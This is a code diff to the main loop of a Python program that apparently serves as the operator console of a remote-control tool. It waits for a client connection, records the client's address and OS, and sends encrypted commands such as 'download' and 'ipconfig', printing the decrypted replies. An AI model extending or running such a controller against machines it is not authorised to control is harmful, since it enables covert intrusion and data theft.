@@ -14,9 +14,10 @@ def main():
 
     while True:
         client_init = listener.init_listen()
-        print(client_init)
         if client_init is not None:
-            client_addr = client_init[0]
+            client_addr = client_init["addr"][0]
+            data = json.loads(client_init["data"])
+            client_os = data["params"]
             break
         else:
             print(client_init)
@@ -35,18 +36,22 @@ def main():
 
         if command == "help":
             help()
+
         elif command == "stop":
             listener.stop()
             break
-        elif command == "download":
+
+        elif command == "download" or command == "ipconfig":
             request = json.dumps({
-                'command': 'download',
+                'type': 'command',
+                'action': command,
                 'params': params
             }).encode('utf-8')
             response = listener.prompt(cipher.encrypt_message(request))
             decrypted = cipher.decrypt_message(response)
             print(response)
             print(json.loads(decrypted))
+
         else:
             data = json.dumps(
                 {
